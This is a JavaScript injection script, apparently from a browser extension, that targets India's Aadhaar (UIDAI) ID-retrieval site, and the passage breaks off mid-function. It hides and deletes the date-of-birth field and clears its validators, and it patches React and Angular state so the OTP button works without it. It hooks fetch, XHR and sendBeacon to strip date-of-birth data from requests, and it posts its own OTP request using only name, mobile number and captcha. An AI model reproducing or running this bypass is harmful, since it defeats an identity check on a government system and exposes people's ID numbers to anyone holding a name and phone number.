/**
 * UIDAI Engine v12 — PAGE context injection + OTP pipeline
 */
(function (root, factory) {
  if (typeof module !== 'undefined' && module.exports) {
    module.exports = factory();
  } else {
    root.UidaiRetrieveEngine = factory();
  }
})(typeof globalThis !== 'undefined' ? globalThis : this, function () {
  const DISABLED_MARK = 'rebel-dob-disabled';
  const HIDDEN_MARK = 'rebel-dob-hidden';
  const DOB_LABEL = /date\s*of\s*birth|\bdob\b|birth\s*date|जन्म|जन्म\s*तिथि/i;
  const ENGINE_VERSION = '12.4.5';

  let dobWatcher = null;
  let watchTimer = null;
  let bypassPoller = null;
  let syncingDom = false;
  const nativeInputSet = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;

  function norm(s) {
    return (s || '').replace(/\s+/g, ' ').trim().toLowerCase();
  }

  function qAll(sel) {
    const out = [];
    const seen = new Set();
    function scan(root) {
      if (!root?.querySelectorAll) return;
      root.querySelectorAll(sel).forEach((el) => {
        if (seen.has(el)) return;
        seen.add(el);
        out.push(el);
      });
      root.querySelectorAll('*').forEach((el) => {
        if (el.shadowRoot) scan(el.shadowRoot);
      });
    }
    scan(document);
    return out;
  }

  function isVisible(el, uiSel) {
    if (!el) return false;
    if (uiSel && el.closest(uiSel)) return false;
    const r = el.getBoundingClientRect();
    const s = getComputedStyle(el);
    return r.width > 0 && r.height > 0 && s.display !== 'none' && s.visibility !== 'hidden';
  }

  function isInDom(el, uiSel) {
    if (!el || !el.isConnected) return false;
    if (uiSel && el.closest(uiSel)) return false;
    let cur = el;
    while (cur && cur !== document.body) {
      const s = getComputedStyle(cur);
      if (s.display === 'none' || s.visibility === 'hidden') return false;
      cur = cur.parentElement;
    }
    return true;
  }

  function isLinkish(el) {
    if (!el) return false;
    const tag = (el.tagName || '').toLowerCase();
    if (tag === 'a' || tag === 'button') return true;
    if (el.getAttribute('role') === 'button' || el.getAttribute('role') === 'link') return true;
    if (el.closest?.('[matSuffix], [matsuffix], .mat-mdc-form-field-text-suffix')) return true;
    const st = getComputedStyle(el);
    return st.cursor === 'pointer' || st.textDecorationLine?.includes('underline');
  }

  function isFormLabel(el) {
    return !!el?.closest?.('mat-label, label, .mdc-floating-label, .mat-mdc-floating-label, legend');
  }

  function fieldContainer(el) {
    return (
      el?.closest(
        'mat-form-field, .mat-mdc-form-field, .mat-form-field-wrapper, .form-group, .mb-3, .mb-4, [class*="form-field"]'
      ) || el?.parentElement?.parentElement || el?.parentElement
    );
  }

  function labelTextFor(input, container) {
    const c = container || fieldContainer(input);
    const direct = c?.querySelector('mat-label, label, .mdc-floating-label, .mat-mdc-floating-label, legend');
    if (direct?.textContent) return norm(direct.textContent);
    return norm(input?.getAttribute('placeholder') || input?.getAttribute('aria-label') || '');
  }

  function isDobInput(input) {
    if (!input || input.type === 'hidden') return false;
    const n = norm(input.name || input.id || '');
    if (n === 'dob' || n === 'calender') return true;
    const blob = labelTextFor(input, fieldContainer(input));
    const ph = norm(input.placeholder || '');
    return (
      DOB_LABEL.test(blob) ||
      DOB_LABEL.test(ph) ||
      input.type === 'date' ||
      input.hasAttribute('matDatepicker') ||
      input.hasAttribute('matdatepicker') ||
      !!input.closest('mat-form-field')?.querySelector('mat-datepicker-toggle')
    );
  }

  function detectFramework() {
    if (document.querySelector('#root') && !document.querySelector('[ng-version], app-root')) return 'react';
    if (document.querySelector('[ng-version], app-root')) return 'angular';
    const sample = document.querySelector('input[name="mobile"], input[name="name"]');
    if (sample && Object.keys(sample).some((k) => k.startsWith('__reactFiber'))) return 'react';
    return 'unknown';
  }

  function isReactSite() {
    return detectFramework() === 'react';
  }

  function getReactFiber(el) {
    if (!el) return null;
    const k = Object.keys(el).find((x) => x.startsWith('__reactFiber'));
    return k ? el[k] : null;
  }

  function getReactProps(el) {
    if (!el) return null;
    const k = Object.keys(el).find((x) => x.startsWith('__reactProps'));
    return k ? el[k] : null;
  }

  function setReactInputValue(input, val, log) {
    if (!input) return false;
    const props = getReactProps(input);
    try {
      if (input._valueTracker) input._valueTracker.setValue('');
      nativeInputSet?.call(input, val);
    } catch (_e) {}
    try {
      input.dispatchEvent(
        new InputEvent('input', { bubbles: true, cancelable: true, inputType: 'insertText', data: val })
      );
    } catch (_e1) {
      input.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
    }
    input.dispatchEvent(new Event('change', { bubbles: true, cancelable: true }));
    if (props?.onChange) {
      try {
        props.onChange({ target: input, currentTarget: input });
      } catch (_e2) {}
    }
    return true;
  }

  function findReactFormWrapper() {
    const btn = findOtpButton();
    let f = getReactFiber(btn);
    for (let i = 0; i < 20 && f; i++, f = f.return) {
      if (f.pendingProps && 'checkNullValues' in f.pendingProps && f.stateNode?.state?.form_values) return f;
    }
    return null;
  }

  function findReactPageFiber() {
    const btn = findOtpButton();
    let f = getReactFiber(btn);
    for (let i = 0; i < 20 && f; i++, f = f.return) {
      if (f.pendingProps?.state?.formData && f.pendingProps?.dispatch) return f;
    }
    return null;
  }

  function patchReactFormValues(log) {
    const wrap = findReactFormWrapper();
    if (!wrap?.stateNode?.state?.form_values) return 0;
    let n = 0;
    const vals = { name: readFieldVal('name'), mobile: readFieldVal('mobile'), captcha: readFieldVal('captcha') };
    wrap.stateNode.state.form_values.forEach((row) => {
      if (row.name === 'dob' || row.name === 'email') {
        row.input = '';
        row.error = false;
        row.error_msg = '';
        n += 1;
        return;
      }
      const v = vals[row.name];
      if (v) {
        row.input = v;
        row.error = false;
        row.error_msg = '';
        n += 1;
      }
    });
    const page = findReactPageFiber();
    if (wrap?.pendingProps) {
      wrap.pendingProps.checkNullValues = false;
      if (wrap.memoizedProps) wrap.memoizedProps.checkNullValues = false;
      n += 1;
    }
    if (page?.pendingProps?.state) {
      page.pendingProps.state.formData = Object.assign({}, page.pendingProps.state.formData || {}, {
        name: vals.name || page.pendingProps.state.formData?.name || null,
        mobile: vals.mobile || page.pendingProps.state.formData?.mobile || null,
        captcha: vals.captcha || page.pendingProps.state.formData?.captcha || null,
        dob: '',
        email: '',
      });
      page.pendingProps.state.disableOTP = false;
      page.pendingProps.state.checkNull = false;
      page.pendingProps.state.isLoading = false;
      n += 1;
    }
    if (n) log?.('info', 'React form_values patched', { count: n });
    return n;
  }

  function getReactCaptchaTxn() {
    const page = findReactPageFiber();
    const id =
      page?.pendingProps?.state?.captchaTxnID ||
      page?.pendingProps?.state?.captchaTxnId ||
      page?.pendingProps?.state?.captchaTxn ||
      null;
    return id && String(id).trim() ? String(id).trim() : null;
  }

  function getReactReqType() {
    const uidChecked = document.querySelector('input[name="pvc"][value="uid"]:checked, #uid:checked');
    return uidChecked ? 'UID' : 'EID';
  }

  function buildReactOtpPayload() {
    return {
      mobileNumber: readFieldVal('mobile'),
      dob: null,
      email: null,
      name: readFieldVal('name'),
      option: getReactReqType(),
      otp: null,
      otpTxnId: null,
      captchaTxnId: getReactCaptchaTxn(),
      captcha: readFieldVal('captcha'),
      resendOtp: false,
    };
  }

  const REACT_OTP_URL = 'https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid';

  function reactUuid() {
    try {
      return crypto.randomUUID();
    } catch (_e) {
      return 'rebel-' + Date.now() + '-' + Math.random().toString(16).slice(2);
    }
  }

  function isRebelOtpHandler(fn) {
    return typeof fn === 'function' && fn.__rebelOtpHandler === true;
  }

  function logOtpApiBody(log, status, text) {
    if (!text) return false;
    log?.('info', 'OTP xhr response', { status, resp: text.slice(0, 200) });
    try {
      const j = JSON.parse(text);
      const msg =
        j?.errorDetails?.messageEnglish || j?.messageEnglish || j?.message || j?.status || '';
      if (msg) log?.('info', 'UIDAI jawab', { status, msg: String(msg).slice(0, 160) });
      if (/invalid.*captcha/i.test(String(msg))) {
        log?.('warn', 'Captcha galat — image refresh karke dubara bharo');
      }
      if (/timed?\s*out|refresh the captcha/i.test(String(msg))) {
        log?.('warn', 'Captcha expire — naya captcha bharo');
      }
      if (j?.errorCode && !/otp.*sent|success/i.test(String(msg))) return false;
      if (/otp.*sent|success|transaction/i.test(String(msg))) return true;
    } catch (_e) {}
    return status >= 200 && status < 300;
  }

  let lastOtpSendAt = 0;
  let lastOtpTapAt = 0;

  function sendOtpViaHookedXhr(log) {
    if (Date.now() - lastOtpSendAt < 1500) return Promise.resolve(false);
    lastOtpSendAt = Date.now();
    syncReactInputs(log);
    patchReactFormValues(log);
    const payload = buildReactOtpPayload();
    if (!payload.mobileNumber || !payload.captcha) {
      log?.('warn', 'OTP skip — mobile/captcha missing');
      return Promise.resolve(false);
    }
    if (!payload.captchaTxnId) {
      log?.('warn', 'captchaTxnId missing — captcha image refresh karo');
    }
    const body = JSON.stringify(stripDobFromBody(payload).body);
    log?.('info', 'OTP bhej rahe hain', {
      mobile: payload.mobileNumber,
      captchaTxnId: payload.captchaTxnId || null,
    });
    return new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', REACT_OTP_URL, true);
      xhr.withCredentials = true;
      xhr.setRequestHeader('Accept', 'application/json, text/plain, */*');
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.setRequestHeader('appid', 'MYAADHAAR');
      xhr.setRequestHeader('accept-language', 'en_IN');
      xhr.setRequestHeader('x-request-id', reactUuid());
      xhr.onload = function () {
        const ok = logOtpApiBody(log, xhr.status, xhr.responseText || '');
        if (ok) log?.('info', 'OTP sent — UIDAI ' + xhr.status);
        resolve(ok);
      };
      xhr.onerror = function () {
        log?.('warn', 'OTP xhr network error — internet / page reload try karo');
        resolve(false);
      };
      xhr.ontimeout = function () {
        log?.('warn', 'OTP xhr timeout');
        resolve(false);
      };
      try {
        xhr.timeout = 30000;
        xhr.send(body);
      } catch (err) {
        log?.('warn', 'OTP xhr send fail', String(err).slice(0, 100));
        resolve(false);
      }
    });
  }

  async function reactGenerateOtpSend(log) {
    return sendOtpViaHookedXhr(log);
  }

  function callNativeGenerateOtp(btn, log, ev) {
    const parent = getReactFiber(btn)?.return;
    const native = parent?.pendingProps?.onClick;
    if (typeof native !== 'function' || isRebelOtpHandler(native)) return false;
    try {
      native.call(parent.stateNode || btn, ev || { preventDefault() {}, stopPropagation() {} });
    } catch (_e) {}
    return true;
  }

  function rebelOtpTap(btn, uiSel, log, ev) {
    if (Date.now() - lastOtpTapAt < 1200) return;
    lastOtpTapAt = Date.now();
    syncReactInputs(log);
    patchReactFormValues(log);
    forceReactOtpClickable(log, true);
    if (!isDobBypassed(uiSel)) {
      callNativeGenerateOtp(btn, log, ev);
      return;
    }
    const hitsBefore = window.__rebelOtpHits || 0;
    log?.('info', 'React native OTP try');
    callNativeGenerateOtp(btn, log, ev);
    setTimeout(function () {
      if ((window.__rebelOtpHits || 0) > hitsBefore) {
        log?.('info', 'UIDAI ko OTP request bheji (native)');
        return;
      }
      log?.('warn', 'Native OTP miss — direct xhr retry');
      sendOtpViaHookedXhr(log);
    }, 2200);
  }

  function patchReactOtpClick(uiSel, log) {
    const btn = findOtpButton();
    if (!btn) return false;
    const btnProps = getReactProps(btn);
    if (!btnProps) return false;
    const innerHandler = function rebelInnerOtpBypass(ev) {
      rebelOtpTap(btn, uiSel, log, ev);
    };
    innerHandler.__rebelOtpHandler = true;
    btnProps.onClick = innerHandler;
    armReactOtpDomTap(btn, uiSel, log);
    return true;
  }

  let otpArmLogAt = 0;

  function armReactOtpDomTap(btn, uiSel, log) {
    if (!btn) return;
    if (!btn.dataset.rebelOtpDomArmed) {
      btn.dataset.rebelOtpDomArmed = '1';
      const onTap = function (ev) {
        if (!isDobBypassed(uiSel)) return;
        rebelOtpTap(btn, uiSel, log, ev);
      };
      btn.addEventListener('touchend', onTap, { capture: true, passive: true });
      btn.addEventListener('pointerup', onTap, true);
    }
    if (Date.now() - otpArmLogAt > 15000) {
      otpArmLogAt = Date.now();
      log?.('info', 'React Send OTP tap armed v12.4.5');
    }
  }

  let lastOtpEnableLog = 0;

  function forceReactOtpClickable(log, quiet) {
    const btn = findOtpButton();
    if (!btn) return false;
    const fiber = getReactFiber(btn);
    const parent = fiber?.return;
    [parent, fiber].forEach((f) => {
      if (!f?.pendingProps) return;
      f.pendingProps.disabled = false;
      f.pendingProps.loading = false;
      if (f.memoizedProps) {
        f.memoizedProps.disabled = false;
        f.memoizedProps.loading = false;
      }
    });
    const page = findReactPageFiber();
    if (page?.pendingProps?.state) {
      page.pendingProps.state.disableOTP = false;
      page.pendingProps.state.isLoading = false;
    }
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.setAttribute('aria-disabled', 'false');
    btn.classList.remove('mat-mdc-button-disabled', 'mat-button-disabled', 'disabled', 'mdc-button--disabled');
    btn.style.pointerEvents = 'auto';
    btn.style.opacity = '1';
    btn.style.cursor = 'pointer';
    let p = btn.parentElement;
    for (let i = 0; i < 4 && p; i++, p = p.parentElement) {
      p.style.pointerEvents = 'auto';
    }
    if (!quiet && Date.now() - lastOtpEnableLog > 8000) {
      lastOtpEnableLog = Date.now();
      log?.('info', 'React Send OTP enabled');
    }
    return true;
  }

  function enableReactOtpButton(log) {
    return forceReactOtpClickable(log, false);
  }

  function neutralizeReactDob(uiSel, log) {
    injectCss();
    let n = 0;
    getDobInputs().forEach((input) => {
      setReactInputValue(input, '', log);
      input.removeAttribute('required');
      input.required = false;
      input.dataset.rebelDobOff = '1';
      const box = fieldContainer(input);
      if (box) {
        box.classList.add(HIDDEN_MARK);
        box.setAttribute('data-rebel-dob-hidden', '1');
        box.style.setProperty('display', 'none', 'important');
      }
      n += 1;
    });
    qAll('input[name="email"]').forEach((input) => {
      setReactInputValue(input, '', log);
      const box = fieldContainer(input);
      if (box) {
        box.classList.add('rebel-email-hidden');
        box.setAttribute('data-rebel-email-hidden', '1');
        box.style.setProperty('display', 'none', 'important');
      }
    });
    patchReactFormValues(log);
    enableReactOtpButton(log);
    if (n) log?.('info', 'React DOB neutralized', { count: n });
    return n;
  }

  function syncReactInputs(log) {
    if (!isReactSite()) return 0;
    let n = 0;
    ['name', 'mobile', 'captcha'].forEach((name) => {
      const input = document.querySelector('input[name="' + name + '"]');
      const val = readInputVal(input);
      if (input && val && setReactInputValue(input, val, log)) n += 1;
    });
    getMatFields().forEach((f) => {
      const type = classifyField(f);
      if (type === 'dob' || type === 'toggle' || type === 'email') return;
      const val = readInputVal(f.input);
      if (!val) return;
      if (setReactInputValue(f.input, val, log)) n += 1;
    });
    patchReactFormValues(log);
    enableReactOtpButton(log);
    if (n) log?.('info', 'React inputs synced', { count: n });
    return n;
  }

  function getDobInputs() {
    return qAll('input, textarea').filter(isDobInput);
  }

  function findDobBlocks() {
    const blocks = new Set();
    getDobInputs().forEach((input) => {
      const box = fieldContainer(input);
      if (box) blocks.add(box);
    });
    qAll('input[type="date"], input[type="datetime-local"]').forEach((input) => {
      const box = fieldContainer(input);
      if (box) blocks.add(box);
    });
    qAll('mat-form-field, .mat-mdc-form-field, .form-group, [class*="form-field"]').forEach((block) => {
      const blob = norm(block.textContent || '').slice(0, 120);
      if (DOB_LABEL.test(blob)) blocks.add(block);
    });
    qAll('mat-datepicker-toggle').forEach((t) => {
      const box = fieldContainer(t);
      if (box) blocks.add(box);
    });
    return Array.from(blocks);
  }

  function dobValuesFor() {
    return [];
  }

  function getMatFields() {
    const seen = new Set();
    const out = [];
    qAll('mat-form-field, .mat-mdc-form-field').forEach((mff) => {
      const input = mff.querySelector('input:not([type="hidden"]), textarea');
      if (!input || seen.has(input)) return;
      seen.add(input);
      const label = labelTextFor(input, mff);
      out.push({ mff, label, input });
    });
    qAll('input:not([type="hidden"]):not([type="radio"]):not([type="checkbox"])').forEach((input) => {
      if (seen.has(input)) return;
      seen.add(input);
      out.push({ mff: fieldContainer(input), label: labelTextFor(input), input });
    });
    return out;
  }

  function classifyField(f) {
    const byName = norm(f.input?.name || f.input?.id || '');
    if (byName === 'dob' || byName === 'calender') return 'dob';
    if (byName === 'mobile') return 'mobile';
    if (byName === 'email') return 'email';
    if (byName === 'captcha') return 'captcha';
    if (byName === 'name') return 'name';
    const l = f.label;
    if (DOB_LABEL.test(l) || isDobInput(f.input)) return 'dob';
    if (/^or\s/.test(l)) return 'toggle';
    if ((/enter\s*e-?mail/.test(l) || f.input.type === 'email') && !/mobile/.test(l)) return 'email';
    if (/mobile|phone|मोबाइल/.test(l) && !/email/.test(l)) return 'mobile';
    if (/name|नाम/.test(l)) return 'name';
    if (/captcha/.test(l)) return 'captcha';
    return 'other';
  }

  function injectCss() {
    if (document.getElementById('rebel-engine-css')) return;
    const st = document.createElement('style');
    st.id = 'rebel-engine-css';
    st.textContent =
      '.' +
      HIDDEN_MARK +
      ',.rebel-email-hidden{display:none!important;visibility:hidden!important;height:0!important;overflow:hidden!important;margin:0!important;padding:0!important;}' +
      '.' +
      DISABLED_MARK +
      '{opacity:.55!important;pointer-events:none!important;user-select:none!important;}' +
      '.' +
      DISABLED_MARK +
      ' input,.' +
      DISABLED_MARK +
      ' button,.' +
      DISABLED_MARK +
      ' mat-datepicker-toggle{cursor:not-allowed!important;pointer-events:none!important;background:#f3f4f6!important;}';
    (document.head || document.documentElement).appendChild(st);
  }

  /** DOB field screen se hat jaye */
  function hideBlocks(blocks, cssClass, dataAttr, log, msg) {
    injectCss();
    blocks.forEach((block) => {
      block.classList.add(cssClass);
      block.setAttribute(dataAttr, '1');
      block.style.setProperty('display', 'none', 'important');
    });
    if (blocks.length) log?.('info', msg, { blocks: blocks.length });
    return blocks.length;
  }

  function hideDob(uiSel, log) {
    return hideBlocks(findDobBlocks(), HIDDEN_MARK, 'data-rebel-dob-hidden', log, 'DOB hidden (bypass)');
  }

  function findEmailBlocks() {
    const blocks = new Set();
    getMatFields().forEach((f) => {
      if (classifyField(f) !== 'email') return;
      if (f.mff) blocks.add(f.mff);
    });
    return Array.from(blocks);
  }

  function hideEmail(uiSel, log) {
    return hideBlocks(findEmailBlocks(), 'rebel-email-hidden', 'data-rebel-email-hidden', log, 'Email hidden (mobile mode)');
  }

  function isEmailNeutralized(input) {
    return input?.dataset?.rebelEmailOff === '1' || !!input?.closest?.('[data-rebel-email-hidden]');
  }

  /** Angular email empty block karta hai — disable + validators clear */
  function isDobPayloadKey(key) {
    const k = String(key || '');
    if (!k) return false;
    if (isDobControlKey(k)) return true;
    if (/^(dob|dateofbirth|date_of_birth|dateOfBirth|birthDate|birth_date|birthDt|dtbirth|userdob|dobstr|dobdate|dateOfBirthStr)$/i.test(k))
      return true;
    if (/\bdob\b/i.test(k)) return true;
    if (/birth/i.test(k) && /date|dt|day/i.test(k)) return true;
    return false;
  }

  function stripDobDeep(val, depth, removed) {
    const rm = removed || [];
    if (val == null || depth > 14) return val;
    if (typeof val === 'string') {
      const t = val.trim();
      if ((t.startsWith('{') && t.endsWith('}')) || (t.startsWith('[') && t.endsWith(']'))) {
        try {
          const parsed = stripDobDeep(JSON.parse(t), depth + 1, rm);
          return JSON.stringify(parsed);
        } catch (_e) {}
      }
      if (t.includes('=') && /dob|birth|dateofbirth/i.test(t)) {
        const kept = [];
        t.split('&').forEach((p) => {
          const k = decodeURIComponent((p.split('=')[0] || '')).trim();
          if (isDobPayloadKey(k)) rm.push(k);
          else kept.push(p);
        });
        return kept.join('&');
      }
      return val;
    }
    if (val instanceof URLSearchParams) {
      const out = new URLSearchParams();
      val.forEach((v, k) => {
        if (isDobPayloadKey(k)) rm.push(k);
        else out.append(k, v);
      });
      return out;
    }
    if (val instanceof FormData) {
      const fd = new FormData();
      val.forEach((v, k) => {
        if (isDobPayloadKey(k)) rm.push(k);
        else fd.append(k, v);
      });
      return fd;
    }
    if (Array.isArray(val)) return val.map((x) => stripDobDeep(x, depth + 1, rm));
    if (typeof val === 'object') {
      const out = {};
      Object.entries(val).forEach(([k, v]) => {
        if (isDobPayloadKey(k)) {
          rm.push(k);
          return;
        }
        out[k] = stripDobDeep(v, depth + 1, rm);
      });
      return out;
    }
    return val;
  }

  function stripDobFromBody(body) {
    const removed = [];
    const stripped = stripDobDeep(body, 0, removed);
    return { body: stripped, removed: [...new Set(removed)] };
  }

  const NET_NOISE =
    /google-analytics|googletagmanager|g\.collect|doubleclick|facebook\.com|hotjar|clarity\.ms|analytics\.google/i;

  function isRetrieveOtpUrl(url) {
    const u = String(url || '');
    return /otp|retrieve|send|generate|aadhaar|uidai|myaadhaar|auth|verify|validate|submit|gov\.in/i.test(u);
  }

  /** OTP success = sirf UIDAI API — GA/metrics NAHI */
  function isUidaiOtpHit(url, method) {
    const u = String(url || '');
    if (!u || NET_NOISE.test(u)) return false;
    const abs = /^https?:\/\//i.test(u) ? u : location.origin + (u.startsWith('/') ? u : '/' + u);
    if (!/uidai\.gov\.in|myaadhaar/i.test(abs)) {
      if (!/^\//.test(u)) return false;
      if (!/uidai|myaadhaar|gov\.in/i.test(location.hostname)) return false;
    }
    if (/\/send-metrics\b/i.test(u)) return false;
    if (String(method || 'GET').toUpperCase() !== 'POST') return false;
    return /retrieveuideid|retrieveeiduid|\/generic\/|retrieve|generateotp|sendotp|otp|captcha|auth|validate|uideid/i.test(u);
  }

  function shouldStripServerPost(url) {
    const u = String(url || '');
    if (/retrieveeiduid|tathya\.uidai\.gov\.in/i.test(u)) return true;
    if (isRetrieveOtpUrl(u)) return true;
    if (/^\//.test(u) && /myaadhaar|uidai|retrieve|otp|aadhaar/i.test(location.pathname + location.host)) return true;
    if (/uidai\.gov\.in|myaadhaar/i.test(u)) return true;
    if (/uidai|myaadhaar|gov\.in/i.test(location.hostname) && (u === '' || /^\//.test(u))) return true;
    return false;
  }

  function installNetworkBypass(hooks) {
    if (window.__rebelNetBypass11) return;
    window.__rebelNetBypass11 = true;
    const log = hooks?.log;
    const enabled = hooks?.enabled || (() => true);
    const onHit = hooks?.onHit || (() => {});
    const onSuccess = hooks?.onSuccess || onHit;

    function markOtpAttempt(url, method) {
      if (!enabled() || !isUidaiOtpHit(url, method)) return;
      window.__rebelOtpHits = (window.__rebelOtpHits || 0) + 1;
    }
    window.__rebelMarkOtpAttempt = markOtpAttempt;

    function logUidaiResponse(status, text) {
      if (!text) return;
      try {
        const j = JSON.parse(text);
        const msg =
          j?.errorDetails?.messageEnglish ||
          j?.messageEnglish ||
          j?.message ||
          j?.status ||
          '';
        if (msg) log?.('info', 'UIDAI jawab', { status, msg: String(msg).slice(0, 160) });
        if (j?.errorCode && !/success|sent/i.test(String(msg))) {
          log?.('warn', 'UIDAI error', { code: j.errorCode, msg: String(msg).slice(0, 120) });
        }
      } catch (_e) {}
    }

    function notifySuccess(kind, method, url, status, text) {
      if (!enabled() || !isUidaiOtpHit(url, method)) return;
      logUidaiResponse(status, text);
      if (status < 200 || status >= 300) return;
      onSuccess(kind, method, url, status);
    }

    function processPost(url, method, body) {
      if (!enabled() || String(method).toUpperCase() !== 'POST' || body == null) return { body, removed: [] };
      if (!shouldStripServerPost(url)) return { body, removed: [] };
      markOtpAttempt(url, method);
      const { body: stripped, removed } = stripDobFromBody(body);
      if (removed.length) {
        log?.('info', 'Server request se DOB hata di', {
          url: String(url || '').slice(0, 100),
          removed,
        });
      }
      return { body: stripped, removed };
    }

    if (window.XMLHttpRequest?.prototype && !window.__rebelOrigXhrOpen) {
      window.__rebelOrigXhrOpen = window.XMLHttpRequest.prototype.open;
      window.__rebelOrigXhrSend = window.XMLHttpRequest.prototype.send;
      window.__rebelOrigXhrSetHeader = window.XMLHttpRequest.prototype.setRequestHeader;
    }

    const origFetch = window.fetch;
    if (origFetch) {
      window.__rebelOrigFetch = origFetch;
      window.fetch = function (input, init) {
        if (input instanceof Request && (!init || init.body === undefined)) {
          const req = input;
          const method = String(req.method || 'GET').toUpperCase();
          const url = req.url || '';
          if (enabled() && method === 'POST' && shouldStripServerPost(url)) {
            return req.text().then((text) => {
              const { body, removed } = processPost(url, method, text);
              onHit('fetch', method, url);
              const headers = new Headers(req.headers);
              if (removed.length) log?.('info', 'fetch POST stripped', { removed });
              return origFetch.call(window, url, {
                method: req.method,
                headers,
                body,
                credentials: req.credentials,
                mode: req.mode,
                cache: req.cache,
                redirect: req.redirect,
                referrer: req.referrer,
                integrity: req.integrity,
              }).then(async function (res) {
                let text = '';
                try {
                  text = await res.clone().text();
                } catch (_e) {}
                notifySuccess('fetch', method, url, res.status, text);
                return res;
              });
            });
          }
          return origFetch.call(this, input, init);
        }

        const opts = init ? Object.assign({}, init) : {};
        const url = typeof input === 'string' ? input : input?.url || '';
        const method = String(opts.method || (input instanceof Request ? input.method : 'GET')).toUpperCase();
        if (opts.body != null) {
          const r = processPost(url, method, opts.body);
          opts.body = r.body;
        }
        return origFetch.call(this, input, opts).then(async function (res) {
          let text = '';
          try {
            text = await res.clone().text();
          } catch (_e) {}
          notifySuccess('fetch', method, url, res.status, text);
          return res;
        });
      };
    }

    const XHR = window.XMLHttpRequest?.prototype;
    if (XHR) {
      const origOpen = XHR.open;
      const origSend = XHR.send;
      const origSetHeader = XHR.setRequestHeader;
      XHR.open = function (method, url) {
        this.__rebelMethod = String(method || 'GET').toUpperCase();
        this.__rebelUrl = String(url || '');
        this.__rebelHeaders = {};
        return origOpen.apply(this, arguments);
      };
      XHR.setRequestHeader = function (name, value) {
        if (!this.__rebelHeaders) this.__rebelHeaders = {};
        this.__rebelHeaders[name] = value;
        return origSetHeader.apply(this, arguments);
      };
      XHR.send = function (body) {
        const url = this.__rebelUrl || '';
        const method = this.__rebelMethod || 'GET';
        const xhr = this;
        if (!xhr.__rebelDirect && !xhr.__rebelLoadHook) {
          xhr.__rebelLoadHook = true;
          xhr.addEventListener('load', function () {
            notifySuccess('xhr', method, url, xhr.status, xhr.responseText || '');
          });
        }
        if (body != null) {
          const r = processPost(url, method, body);
          body = r.body;
        }
        return origSend.call(this, body);
      };
    }

    if (navigator.sendBeacon) {
      const origBeacon = navigator.sendBeacon.bind(navigator);
      navigator.sendBeacon = function (url, data) {
        const r = processPost(url, 'POST', data);
        return origBeacon(url, r.body);
      };
    }
  }

  /** DOB values EMPTY — fake date KABHI NAHI */
  function clearDobValuesOnly(log) {
    let n = 0;
    syncingDom = true;
    getDobInputs().forEach((input) => {
      delete input.dataset.rebelDobOk;
      delete input.dataset.rebelDobFail;
      input.dataset.rebelDobTry = '0';
      if (nativeInputSet) nativeInputSet.call(input, '');
      else input.value = '';
      try {
        input.valueAsDate = null;
      } catch (_e) {}
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      n += 1;
    });
    syncingDom = false;
    collectFormGroups().forEach((form) => {
      const walk = (group) => {
        Object.entries(group.controls || {}).forEach(([key, ctrl]) => {
          if (isFormGroup(ctrl)) walk(ctrl);
          else if (isDobControlKey(key)) {
            ctrl.clearValidators?.();
            ctrl.setErrors?.(null);
            try {
              ctrl.setValue(null, { emitEvent: false });
            } catch (_e1) {
              try {
                ctrl.setValue('', { emitEvent: false });
              } catch (_e2) {}
            }
            try {
              ctrl.disable({ emitEvent: false });
            } catch (_e3) {}
          }
        });
      };
      walk(form);
      form.updateValueAndValidity?.({ emitEvent: false });
    });
    if (n) log?.('info', 'DOB cleared (empty, no fake date)', { inputs: n });
    return n;
  }

  /** DOB field DOM se physically remove */
  function removeDobFromDom(uiSel, log) {
    let n = 0;
    findDobBlocks().forEach((block) => {
      block.remove();
      n += 1;
    });
    getDobInputs().forEach((input) => {
      const box = fieldContainer(input);
      if (box) box.remove();
      else input.remove();
      n += 1;
    });
    if (n) log?.('info', 'DOB DOM se remove', { count: n });
    return n;
  }

  /** DOB ko form se hatao — validators clear, hide, NO fake date */
  function neutralizeDobControls(uiSel, log) {
    injectCss();
    clearDobValuesOnly(log);
    let n = 0;
    findDobBlocks().forEach((block) => {
      disableDobDom(block);
      block.classList.add(HIDDEN_MARK);
      block.setAttribute('data-rebel-dob-hidden', '1');
      block.style.setProperty('display', 'none', 'important');
      n += 1;
    });
    getDobInputs().forEach((input) => {
      input.disabled = true;
      input.removeAttribute('required');
      input.setAttribute('aria-required', 'false');
      input.setCustomValidity?.('');
      input.removeAttribute('name');
      input.removeAttribute('formcontrolname');
      input.dataset.rebelDobOff = '1';
      const box = fieldContainer(input);
      if (box) {
        box.classList.add(HIDDEN_MARK);
        box.setAttribute('data-rebel-dob-hidden', '1');
        box.style.setProperty('display', 'none', 'important');
      }
      n += 1;
    });
    if (n) log?.('info', 'DOB form logic neutralized', { count: n });
    return n;
  }

  let lastModeClickAt = 0;

  function advancedBypass(uiSel, log) {
    if (isReactSite()) {
      if (dobFieldVisible(uiSel)) neutralizeReactDob(uiSel, log);
      softHideEmailOnly(log, uiSel);
      enableReactOtpButton(log);
      patchReactOtpClick(uiSel, log);
      return {
        dobBypassed: isDobBypassed(uiSel),
        dobVisible: dobFieldVisible(uiSel),
        orLinks: discoverOrLinks(uiSel).map((l) => l.text),
      };
    }
    if (!isDobBypassed(uiSel) && !shouldSkipEmailToggle(uiSel) && Date.now() - lastModeClickAt > 3000) {
      quickModeSwitch(uiSel, log);
      lastModeClickAt = Date.now();
    }
    if (dobFieldVisible(uiSel)) {
      removeDobFromDom(uiSel, log);
      neutralizeDobControls(uiSel, log);
    }
    softHideEmailOnly(log, uiSel);
    enableOtpButtons();
    return {
      dobBypassed: isDobBypassed(uiSel),
      dobVisible: dobFieldVisible(uiSel),
      orLinks: discoverOrLinks(uiSel).map((l) => l.text),
    };
  }

  async function advancedBypassAsync(uiSel, log) {
    await ensureUidaiMobileMode(uiSel, log);
    if (!isDobBypassed(uiSel)) await tryUidaiModeSwitch(uiSel, log);
    if (dobFieldVisible(uiSel)) {
      removeDobFromDom(uiSel, log);
      neutralizeDobControls(uiSel, log);
    }
    softHideEmailOnly(log, uiSel);
    enableOtpButtons();
    return {
      dobBypassed: isDobBypassed(uiSel),
      dobVisible: dobFieldVisible(uiSel),
